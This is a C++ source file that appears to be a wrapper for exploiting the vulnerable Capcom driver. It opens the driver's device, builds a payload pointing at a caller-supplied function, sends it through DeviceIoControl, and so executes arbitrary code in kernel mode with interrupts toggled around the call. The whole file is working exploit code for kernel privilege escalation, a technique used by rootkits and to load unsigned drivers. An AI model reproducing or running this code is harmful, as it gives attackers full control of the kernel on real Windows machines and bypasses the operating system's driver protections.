#include <intrin.h>
#pragma intrinsic(_disable)  
#pragma intrinsic(_enable)  

#include "capcom_wrapper.h"
#include "capcom_payload.h"

using namespace capcom::payload;

namespace capcom::wrapper
{
	std::function<void(MmGetSystemRoutineAddress_t)> user_space_function;

	// wrap the std::function inside a generic function call, so we can easily grab this function pointer
	void capcom_function_wrapper(MmGetSystemRoutineAddress_t _MmGetSystemRoutineAddress)
	{
		user_space_function(_MmGetSystemRoutineAddress);
	}

	DWORD capcom_send_payload(HANDLE device, std::function<void(MmGetSystemRoutineAddress_t)> user_function)
	{
		user_space_function = user_function;

		capcom_payload* payload = build_capcom_payload((uintptr_t)&capcom_function_wrapper);
		DWORD output_buffer;
		DWORD bytes_returned;
		if (DeviceIoControl(device, ioctl_x64, &payload->ptr_to_code, 8, &output_buffer, 4, &bytes_returned, nullptr))
		{
			VirtualFree(payload, sizeof(capcom_payload), MEM_RELEASE);
			return 0;
		}

		VirtualFree(payload, sizeof(capcom_payload), MEM_RELEASE);
		return GetLastError();
	}

	capcom_wrapper::capcom_wrapper()
	{
		open_driver_handle();
	}

	void capcom_wrapper::open_driver_handle()
	{
		driver_handle = CreateFile(device_name.c_str(), FILE_ALL_ACCESS, FILE_SHARE_READ, nullptr, FILE_OPEN, FILE_ATTRIBUTE_NORMAL, nullptr);
	}

	void capcom_wrapper::close_driver_handle()
	{
		CloseHandle(driver_handle);
	}

	void capcom_wrapper::execute_in_kernel(std::function<void(MmGetSystemRoutineAddress_t)> user_function)
	{
		// let's pray that we don't context switch in the middle of calling our function :)
		std::function<void(MmGetSystemRoutineAddress_t)> call_with_interrupts = 
			[&user_function](MmGetSystemRoutineAddress_t _MmGetSystemRoutineAddress)
			{
				_enable();
				user_function(_MmGetSystemRoutineAddress);
				_disable();
			};


		capcom_send_payload(driver_handle, call_with_interrupts);
	}
}
